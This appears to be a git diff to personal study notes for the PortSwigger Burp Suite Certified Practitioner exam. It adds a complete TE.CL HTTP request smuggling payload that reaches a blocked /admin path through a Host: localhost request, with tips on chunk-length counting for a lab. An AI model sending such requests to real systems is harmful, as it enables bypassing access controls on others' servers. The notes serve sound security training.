@@ -1,7 +1,7 @@
 
 # Burp-Suite-Certified-Practitioner-Exam-Study
 My personal study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics.  
-The acronym BSCP has nice simular ring like OSCP  :)  
+The acronym BSCP has nice simular ring to it, same as OSCP  :)  
 
 [Foothold](#foothold)  
 [Web Cache Poison](#web-cache-poison)  
@@ -384,7 +384,25 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
 
 ![TE-CL-http-request-smuggle.png](images/TE-CL-http-request-smuggle.png)  
 
->Above TE.CL (Transfer-Encoding / Content-Length) smuggle request count in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminated ZERO, not including the ZERO as part of counting the payload length. The inital POSt request **content-length** is manually set.  
+>**Note:** Repeater menu ensure the **"Update Content-Length"** option is unchecked.  
+
+```
+POST / HTTP/1.1
+Host: TARGET.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```  
+
+>Above TE.CL (Transfer-Encoding / Content-Length) smuggle request count in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminating **ZERO**, not including the ZERO as part of counting the payload length. The inital POST request **content-length** is manually set.  
   
 [PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)  
 
